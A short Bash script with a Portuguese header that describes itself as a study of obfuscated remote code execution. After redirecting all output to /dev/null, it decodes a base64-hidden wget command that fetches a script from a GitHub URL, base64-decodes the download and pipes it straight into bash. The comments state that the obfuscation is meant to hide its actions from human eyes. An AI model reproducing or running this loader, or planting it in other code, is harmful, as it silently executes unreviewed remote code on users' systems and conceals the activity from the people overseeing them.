#!/bin/bash
#
##############################################################################
# Criado por: Rodrigo Pinheiro                                               #
# Data: 16/12/2023                                                           #
# Contato:                                                                   #
#         https://www.linkedin.com/in/rodrigo-pinheiro-214663206/            #
#         https://github.com/devchimpa/                                      #
#                                                                            #
##############################################################################
#
############################################################################
#                                                                          #
#       DESCRIÇÃO:                                                         #
#                                                                          #
#       O OBJETIVO DO SCRIPT É ESTUDAR UMA FORMA DE UTILIZAR RCE           #
#	( REMOTE CODE EXECUTION ) DE MANEIRA CRIPTOGRAFADA.                      # 
#	O SCRIPT UTILIZA BASE64 COM O OBJETIVO DE ESCONDER AS AÇÕES DO           #
#	OLHO HUMANO, E ENVIA AS SAÍDAS PARA /dev/null COMO FORMA DE              #
#	TAMBÉM OCULTAR AS ATIVIDADES.                                            #
#                                                                          #
#                                                                          #
#                                                                          #
############################################################################

##############################################################################
##############################################################################
# BOAS PRÁTICAS:
# ESTE SCRIPT NÃO SEGUE BOAS PRÁTICAS, O OBJETIVO É OBSCURECER O ENTENDIMENTO.
##############################################################################


exec &>/dev/null
bWTKA=$( base64 -d <<< d2dldCAtcSAtTyAtIGh0dHBzOi8vcmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbS9kZXZjaGltcGEvRXN0dWRvcy1TZWN1cml0eS9tYWluL2hhc2hfbnV2ZW0uc2gK  )
bash -c "$bWTKA"  | base64 -d | bash
